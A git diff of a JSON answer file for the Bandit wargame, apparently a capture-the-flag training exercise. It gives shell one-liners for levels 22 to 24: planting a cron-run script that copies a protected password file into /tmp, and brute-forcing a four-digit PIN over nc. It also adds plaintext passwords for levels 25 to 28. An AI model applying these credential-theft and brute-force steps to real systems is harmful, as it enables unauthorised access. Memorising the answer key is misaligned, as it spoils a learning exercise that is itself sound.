@@ -70,12 +70,24 @@
         "cmd": "echo $(echo I am user bandit23 | md5sum | cut -d ' ' -f 1) | xargs -I {} cat /tmp/{}"
     },
     "23": {
-	"cmd": "mkdir -p -m 777 /tmp/wow; echo -e '#!/bin/bash\\ncat /etc/bandit_pass/bandit24 > /tmp/wow/log.log' > /var/spool/bandit24/foo/1.sh; chmod 777 /var/spool/bandit24/foo/1.sh; while [ -e /var/spool/bandit24/foo/1.sh ]; do sleep 60; done; cat /tmp/wow/log.log; rm -rf /tmp/wow;"
+        "cmd": "mkdir -p -m 777 /tmp/wow; echo -e '#!/bin/bash\\ncat /etc/bandit_pass/bandit24 > /tmp/wow/log.log' > /var/spool/bandit24/foo/1.sh; chmod 777 /var/spool/bandit24/foo/1.sh; while [ -e /var/spool/bandit24/foo/1.sh ]; do sleep 60; done; cat /tmp/wow/log.log; rm -rf /tmp/wow;"
     },
     "24": {
-	"cmd": "mkdir -p -m 777 /tmp/wow; for i in $(seq -w 0000 9999); do echo \\\"$(cat /etc/bandit_pass/bandit24) $i\\\" >> /tmp/wow/p.txt; done; cat /tmp/wow/p.txt | nc localhost 30002 | grep \\\"The password of user bandit25\\\" | awk '{print $7}'; rm -rf /tmp/wow"
+        "cmd": "mkdir -p -m 777 /tmp/wow; for i in $(seq -w 0000 9999); do echo \\\"$(cat /etc/bandit_pass/bandit24) $i\\\" >> /tmp/wow/p.txt; done; cat /tmp/wow/p.txt | nc localhost 30002 | grep \\\"The password of user bandit25\\\" | awk '{print $7}'; rm -rf /tmp/wow"
     },
     "25": {
-	"cmd": ""
+        "next_password": "s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ"
+    },
+    "26": {
+        "next_password": "upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB"
+    },
+    "27": {
+        "next_password": "Yz9IpL0sBcCeuG7m9uQFt8ZNpS4HZRcN"
+    },
+    "28": {
+        "next_password": "4pT1t5DENaYuqnqvadYs1oE4QLCdjmJ7"
+    },
+    "29": {
+        "cmd": ""
     }
 }
